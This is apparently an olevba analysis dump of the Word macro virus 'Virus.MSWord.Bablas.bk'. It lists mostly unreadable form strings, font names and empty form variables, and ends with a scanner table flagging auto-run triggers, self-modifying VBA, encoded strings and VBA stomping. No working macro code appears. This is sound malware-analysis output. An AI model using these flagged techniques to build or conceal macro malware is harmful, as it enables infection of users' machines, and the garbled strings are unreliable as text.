- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~~~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���` 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���  
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������?�������?�������/�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AngsanaUPC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wwwwwwp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IrisUPC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Command1'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/i16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |ListBox1_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_MouseMove  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

